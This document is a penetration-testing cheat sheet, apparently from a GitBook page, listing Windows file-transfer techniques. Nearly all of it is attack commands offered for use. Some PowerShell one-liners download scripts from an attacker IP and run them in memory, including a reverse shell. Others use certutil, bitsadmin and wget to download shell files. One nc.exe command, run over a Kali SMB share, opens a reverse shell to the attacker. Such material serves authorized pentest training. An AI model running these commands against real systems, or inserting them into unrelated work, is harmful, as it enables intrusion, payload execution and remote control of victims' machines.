---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/file-transfer/window
---

# Window

### PowerShell

```basic
# Download and Execute on Memory
iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/PowerView.ps1');Get-NetComputer -Ping
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/rev.ps1') | powershell -noprofile -

# Download
Powershell -c Invoke-WebRequest "http: //10.10.10.10/rev.ps1" -OutFile C:\temp\rev.ps1
PS > (new-object net.webclient).downloadfile('http://10.10.10.10/shell.bat', 'C:\users\Public\shell.bat')

cmd > Powershell -c "(new-object net.webclient).downloadfile('http://10.10.10.10/shell.bat', 'C:\users\Public\shell.bat')"
cmd > powershell iwr http://10.10.10.10/file -OutFIle file1

# Wget
wget http://10.10.10.10/PowerView.ps1 -OutFile PowerView.ps1
```

### Certutil

```basic
certutil -f -urlcache http://10.10.10.10/Powerview.ps1 C:\Users\Public\Powerview.ps1
```

### Impacket-smbserver

On Kali machine:

```python
impacket-smbserver share /usr/share/windows-resources/binaries
```

Connect and execute from Window machine:

```basic
\\Kali-IP\share\nc.exe -e cmd.exe Kali-IP 4444
```

Map drive on Window

```basic
net use z: \\10.10.14.2\folder-path
z:
copy file Z:\
```

### Bitsadmin

```basic
bitsadmin /transfer job http://10.10.10.10/file1 C:\users\bob\desktop\file1
```
